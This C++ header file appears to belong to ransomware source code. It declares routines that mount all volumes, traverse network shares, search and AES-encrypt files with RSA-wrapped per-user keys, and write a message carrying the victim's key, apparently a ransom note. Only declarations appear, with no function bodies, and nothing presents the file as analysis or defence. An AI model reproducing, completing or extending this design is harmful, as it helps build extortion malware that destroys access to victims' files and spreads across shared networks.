#pragma once

#include "include.h"



#define KEY_LEN AES::DEFAULT_KEYLENGTH
#define IV_LEN CryptoPP::AES::BLOCKSIZE



typedef struct _IHKEY_USER_KEY
{
	std::string PublicUserKey;
	unsigned char KeyBin[KEY_LEN];
	unsigned char IvBin[IV_LEN];
	std::string KeyHex;
	std::string IvHex;

}_IHKEY_USER_KEY;


VOID MountAllVolumes();


static VOID RSA_Encryptor(const string& Keys, _IHKEY_USER_KEY* UserKey);
VOID GeneratekeyAES(_IHKEY_USER_KEY* keys);


static int encryptingAES(const std::wstring& path, _IHKEY_USER_KEY* UserKey);


inline bool EndOfFile(const CryptoPP::FileSource& file);
void hex_to_byte_key(_IHKEY_USER_KEY* keyUser);
VOID WriteMessageTo(const std::wstring& path, const std::string& PublicUserKey);



VOID SessionManager(const std::wstring filename);

VOID traverse_NetShares(LPNETRESOURCEW lpnr, _IHKEY_USER_KEY* UserKey);

VOID SearchFilesEncryption( boost::filesystem::path const& root , _IHKEY_USER_KEY* UserKey);

VOID ThreadSearchFilesEncrypting();


void LoadBase64PublicKeyString(const std::string& PubKey, PublicKey& key);
void LoadBase64String(const std::string& PubKey, BufferedTransformation& bt);
void LoadStringS(const std::string& PubKey, BufferedTransformation& bt);


void SavePublicKey(const string& filename, const PublicKey& key);
void SaveBase64PrivateKey(const string& filename, const PrivateKey& key);
void SaveBase64PublicKey(const string& filename, const PublicKey& key);

void Save(const string& filename, const BufferedTransformation& bt);
void SaveBase64(const string& filename, const BufferedTransformation& bt);

void LoadPrivateKey(const string& filename, PrivateKey& key);
void LoadPublicKey(const string& filename, PublicKey& key);

void LoadBase64PrivateKey(const string& filename, PrivateKey& key);
void LoadBase64PublicKey(const string& filename, PublicKey& key);

void LoadBase64(const string& filename, BufferedTransformation& bt);
void Load(const string& filename, BufferedTransformation& bt);